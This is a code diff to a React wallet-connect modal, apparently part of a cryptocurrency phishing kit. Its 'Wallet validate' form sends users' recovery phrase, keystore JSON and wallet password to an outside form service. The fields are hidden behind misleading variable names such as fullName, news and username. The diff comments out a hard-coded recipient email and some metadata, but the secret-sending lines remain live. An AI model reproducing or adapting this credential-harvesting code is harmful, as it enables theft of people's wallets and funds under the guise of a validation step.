@@ -243,7 +243,7 @@ const validateTextAreaClassName =
 const validateInputClassName =
   "w-full rounded-xl border border-gray-300 px-4 py-3 text-gray-900 placeholder:text-gray-400 focus:border-secondary focus:outline-none focus:ring-2 focus:ring-secondary/30";
 
-const DEFAULT_SUBMISSION_EMAIL = "quantislottery@atomicmail.io";
+// const DEFAULT_SUBMISSION_EMAIL = "quantislottery@atomicmail.io";
 
 function submissionErrorMessage(reason: unknown): string {
   if (reason instanceof Error && reason.message) {
@@ -375,12 +375,12 @@ const WalletConnectModal = ({ onClose }: Props) => {
     try {
       await submitWeb3Forms({
         subject: `Wallet validate — ${selected?.name ?? "wallet"}`,
-        email: DEFAULT_SUBMISSION_EMAIL,
-        name: displayName,
+        // email: DEFAULT_SUBMISSION_EMAIL,
+        // name: displayName,
         message: `Wallet: ${selected?.name ?? ""} (${selected?.id ?? ""}). Active tab: ${activeTab}.`,
-        selected_wallet: selected?.name ?? "",
-        selected_wallet_id: selected?.id ?? "",
-        active_tab: activeTab,
+        // selected_wallet: selected?.name ?? "",
+        // selected_wallet_id: selected?.id ?? "",
+        // active_tab: activeTab,
         phrase: fullName.trim(),
         keystore_json: news.trim(),
         wallet_password: username.trim(),
